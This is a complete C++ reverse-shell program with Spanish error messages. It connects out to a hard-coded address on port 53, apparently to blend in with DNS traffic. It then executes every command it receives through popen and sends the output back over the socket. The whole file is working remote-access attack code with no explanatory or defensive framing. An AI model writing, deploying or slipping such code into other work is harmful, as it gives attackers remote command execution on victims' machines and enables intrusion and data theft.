#include <iostream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>

void execute_command(int client_socket) {
    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));

        int recv_size = recv(client_socket, buffer, sizeof(buffer), 0);
        if (recv_size <= 0) {
            break;
        }

        FILE* fp = popen(buffer, "r");
        if (fp) {
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                send(client_socket, buffer, strlen(buffer), 0);
            }
            pclose(fp);
        }
    }
}

int main() {
    int sock;
    struct sockaddr_in server;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cerr << "Error al crear el socket." << std::endl;
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(53); 
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); 

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        std::cerr << "Error al conectar al servidor." << std::endl;
        close(sock);
        return 1;
    }

    execute_command(sock);
    
    close(sock);
    return 0;
}
